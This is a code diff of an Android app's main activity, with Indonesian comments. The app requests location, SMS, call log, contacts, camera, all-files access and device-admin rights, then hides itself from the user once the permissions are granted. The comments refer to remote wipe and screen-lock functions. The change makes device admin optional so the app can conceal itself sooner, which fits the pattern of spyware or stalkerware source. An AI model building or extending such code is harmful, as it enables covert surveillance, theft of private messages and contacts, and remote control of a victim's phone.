@@ -57,34 +57,35 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        updateUI()
+        // Guard: jangan update UI jika activity sedang finishing (sudah dipanggil finish())
+        if (!isFinishing) updateUI()
     }
 
     private fun updateUI() {
         val allPermsOk = allPermissionsGranted()
+        // Device admin bersifat opsional — tidak menghalangi app untuk bersembunyi.
+        // Tanpa admin, hanya wipeDevice() dan lockScreen(admin) yang tidak berfungsi.
         val adminOk = dpm.isAdminActive(adminComponent)
-        val setupDone = allPermsOk && adminOk
 
-        crashlytics.log("MainActivity: updateUI allPermsOk=$allPermsOk adminOk=$adminOk setupDone=$setupDone")
+        crashlytics.log("MainActivity: updateUI allPermsOk=$allPermsOk adminOk=$adminOk")
 
-        if (setupDone) {
+        // Cukup semua runtime permission + storage → langsung sembunyikan
+        if (allPermsOk) {
             hideAndExit()
             return
         }
 
         val missing = mutableListOf<String>()
-        if (!allPermsOk) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missing.add("Lokasi")
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missing.add("SMS")
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missing.add("Log Panggilan")
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) missing.add("Kamera")
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) missing.add("Akses File")
-        }
-        if (!adminOk) missing.add("Admin Perangkat")
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missing.add("Lokasi")
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missing.add("SMS")
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missing.add("Log Panggilan")
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) missing.add("Kamera")
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) missing.add("Akses File (All Files Access)")
+        if (!adminOk) missing.add("Admin Perangkat (opsional)")
 
-        crashlytics.log("MainActivity: missing permissions = ${missing.joinToString()}")
-        binding.tvAccessStatus.text = "Izin belum diberikan:\n• ${missing.joinToString("\n• ")}\n\nKetuk tombol untuk berikan izin satu per satu."
+        crashlytics.log("MainActivity: missing = ${missing.joinToString()}")
+        binding.tvAccessStatus.text = "Izin yang belum diberikan:\n• ${missing.joinToString("\n• ")}\n\nKetuk tombol untuk berikan izin."
         binding.tvAccessStatus.setTextColor(getColor(R.color.red))
         binding.btnAccessibility.text = "Berikan Izin →"
         binding.btnAccessibility.visibility = View.VISIBLE
